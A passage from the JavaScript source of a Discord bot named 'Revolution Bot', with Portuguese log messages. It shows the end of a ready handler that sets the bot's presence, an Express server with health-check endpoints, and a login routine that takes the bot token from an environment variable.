  console.log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);
  console.log(`📋 Comandos: ${client.commands.size}`);
  
  client.user.setPresence({
    activities: [{
      name: `${client.guilds.cache.size} servidores | /help`,
      type: 3,
      state: 'REVOLUTION BOT'
    }],
    status: 'online'
  });
});

// ============ SERVIDOR WEB ============

const app = express();
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => res.send('Bot Revolution esta ONLINE!'));
app.get('/health', (req, res) => res.json({ status: 'online', uptime: process.uptime(), servidores: client.guilds.cache.size, comandos: client.commands.size }));

app.listen(PORT, () => console.log(`🌐 Web server rodando na porta ${PORT}`));

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('❌ TOKEN NAO ENCONTRADO!');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  console.error(`❌ Erro ao fazer login: ${error.message}`);
  process.exit(1);
});